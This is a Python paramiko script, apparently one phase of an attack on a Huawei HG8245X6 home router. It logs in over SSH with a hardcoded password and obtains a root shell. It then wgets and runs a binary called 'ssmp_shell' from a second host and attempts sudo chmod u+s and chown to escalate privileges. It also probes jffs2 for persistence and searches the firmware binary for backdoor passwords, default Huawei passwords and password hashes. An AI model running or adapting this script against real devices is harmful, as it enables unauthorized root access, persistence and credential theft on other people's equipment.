#!/usr/bin/env python3
"""
Phase 8 Fixed: Upload via wget from running http-server, then escalate.
HTTP server already running on port 8080.
"""

import paramiko
import time

HOST = "192.168.1.1"
USER = "sUser"
PASSWORD = "EP!99R4HLH9E"
HTTP_BASE = "http://192.168.1.20:8080"

def recv_until(chan, markers, timeout=10):
    if isinstance(markers, str):
        markers = [markers]
    buf = b""
    start = time.time()
    while time.time() - start < timeout:
        if chan.recv_ready():
            chunk = chan.recv(4096)
            buf += chunk
            decoded = buf.decode('utf-8', errors='replace')
            for marker in markers:
                if marker in decoded:
                    return decoded
        elif chan.exit_status_ready():
            break
        time.sleep(0.1)
    return buf.decode('utf-8', errors='replace')

def send_cmd(chan, cmd, marker="# ", timeout=20, show=True):
    chan.send(cmd + "\n")
    out = recv_until(chan, [marker, "WAP>", "SU_WAP>", "$ ", "Password:"], timeout)
    if show:
        lines = [l.strip() for l in out.strip().split('\n') if l.strip()]
        for l in lines:
            if cmd[:25] not in l:
                print(f"  {l}")
    return out

def connect_and_shell():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PASSWORD, timeout=10,
                   look_for_keys=False, allow_agent=False)
    chan = client.invoke_shell(width=220, height=50)
    time.sleep(2)
    out = recv_until(chan, ["WAP>", "Remove one session", "Enter the ID"], timeout=8)
    if "Remove one session" in out or "Enter the ID" in out:
        print("[!] Session limit - removing session 1...")
        chan.send("1\n")
        time.sleep(2)
        recv_until(chan, "WAP>", timeout=10)
    chan.send("su\n")
    recv_until(chan, ["SU_WAP>", "success"], timeout=8)
    chan.send("shell\n")
    recv_until(chan, "# ", timeout=8)
    print("[+] Shell obtained!\n")
    return client, chan

def main():
    print("=" * 62)
    print("  HG8245X6 - srv_ssmp Escalation via wget + sudo")
    print("=" * 62)

    client, chan = connect_and_shell()

    # ── 1. Download ssmp_shell via wget ───────────────────────
    print("[*] Downloading ssmp_shell from HTTP server...")
    send_cmd(chan, f"wget -q {HTTP_BASE}/ssmp_shell -O /tmp/ssmp_shell && echo DL_OK || echo DL_FAIL", timeout=15)
    send_cmd(chan, "ls -la /tmp/ssmp_shell")
    send_cmd(chan, "chmod +x /tmp/ssmp_shell")

    # ── 2. Try running it directly (will fail - no SUID/caps) ─
    print("\n[*] Running ssmp_shell directly (expect failure):")
    send_cmd(chan, "/tmp/ssmp_shell 2>&1", timeout=8)

    # ── 3. Check full sudoers ─────────────────────────────────
    print("\n[*] Full sudoers content:")
    send_cmd(chan, "sudo cat /etc/sudoers 2>&1 | cat")

    # ── 4. Inspect sudo-allowed scripts ──────────────────────
    print("\n[*] /bin/customize_cert_proc.sh contents:")
    send_cmd(chan, "cat /bin/customize_cert_proc.sh 2>&1")

    print("\n[*] /bin/create_factory_file.sh contents:")
    send_cmd(chan, "cat /bin/create_factory_file.sh 2>&1")

    print("\n[*] /bin/customize_del_file.sh:")
    send_cmd(chan, "cat /bin/customize_del_file.sh 2>&1")

    print("\n[*] /bin/customize_kill_proc.sh:")
    send_cmd(chan, "cat /bin/customize_kill_proc.sh 2>&1")

    # ── 5. Try chmod u+s with sudo ────────────────────────────
    print("\n[*] Trying sudo chmod on ssmp_shell (long shot):")
    send_cmd(chan, "sudo chmod u+s /tmp/ssmp_shell 2>&1")
    send_cmd(chan, "sudo chown srv_ssmp /tmp/ssmp_shell 2>&1")

    # ── 6. Check if jffs2 is writable ────────────────────────
    print("\n[*] Testing jffs2 write:")
    send_cmd(chan, "ls -la /mnt/jffs2/ 2>&1 | head -15")
    send_cmd(chan, "touch /mnt/jffs2/wtest 2>&1 && echo JFFS2_OK || echo JFFS2_DENY")
    send_cmd(chan, "rm -f /mnt/jffs2/wtest 2>/dev/null")

    # ── 7. If jffs2 is writable, create a persistent SUID ────
    # Note: We'd need to put it there AND set SUID which requires root
    
    # ── 8. Check ssmp binary for a backdoor password ──────────
    print("\n[*] Looking for hardcoded password in /bin/ssmp:")
    # Look for 8-16 char printable strings that could be passwords
    send_cmd(chan, r"od -c /bin/ssmp | grep -oE '[a-zA-Z0-9@#$!]{8,20}' | sort -u | head -40", timeout=15)

    # ── 9. Check /bin/ssmp for known default passwords ────────
    print("\n[*] Checking ssmp binary for common Huawei passwords:")
    for pwd in ["admin", "Admin1234", "HuaweiHG", "telecomadmin", "superonline", 
                "administ", "support", "password", "Hg8245x6", "HG8245X6",
                "Dopra", "dopra", "huawei123", "Huawei123"]:
        chan.send(f"grep -c '{pwd}' /bin/ssmp 2>/dev/null\n")
        out = recv_until(chan, "# ", timeout=3)
        count_line = [l for l in out.split('\n') if l.strip() and l.strip().isdigit()]
        if count_line and int(count_line[0]) > 0:
            print(f"  [+] Found in binary: '{pwd}' ({count_line[0]} occurrences)")

    # ── 10. Try su with ssmp hash from the binary itself ──────
    print("\n[*] Searching for credential patterns in ssmp:")
    send_cmd(chan, r"cat /bin/ssmp | tr -cd '[:print:]\n' | grep -oE '\$[16]?\$[./A-Za-z0-9]{8,}\$[./A-Za-z0-9]{20,}' | head -10", timeout=10)

    # ── 11. Look for passwd hash in ssmp binary/data ──────────
    print("\n[*] SHA/MD5 style hashes in ssmp binary:")
    send_cmd(chan, r"cat /bin/ssmp | tr -cd '[:print:]\n' | grep -oE '[a-f0-9]{32,64}' | head -20", timeout=10)

    # ── 12. Try the SU_WAP> prompt's 'su' command in depth ───
    print("\n[*] Checking SU_WAP> available commands:")
    chan.send("exit\n")  # exit shell to SU_WAP
    recv_until(chan, "SU_WAP>", timeout=5)
    
    chan.send("?\n")
    out = recv_until(chan, "SU_WAP>", timeout=8)
    print(f"  SU_WAP commands:\n{out}")
    
    chan.send("help\n")
    out = recv_until(chan, "SU_WAP>", timeout=8)
    print(f"  help: {out.strip()[-500:]}")

    # ── 13. Check if SU_WAP has 'ssmp' command ────────────────
    for cmd in ["user", "passwd", "account", "adduser", "ssmp", "admin"]:
        chan.send(f"{cmd}\n")
        out = recv_until(chan, "SU_WAP>", timeout=5)
        out_clean = out.strip().replace('\r', '')
        if "not exist" not in out_clean.lower() and "ERROR" not in out_clean:
            print(f"  [+] '{cmd}' command exists: {out_clean[-200:]}")

    client.close()
    print("\n[*] Session closed.")

if __name__ == "__main__":
    main()
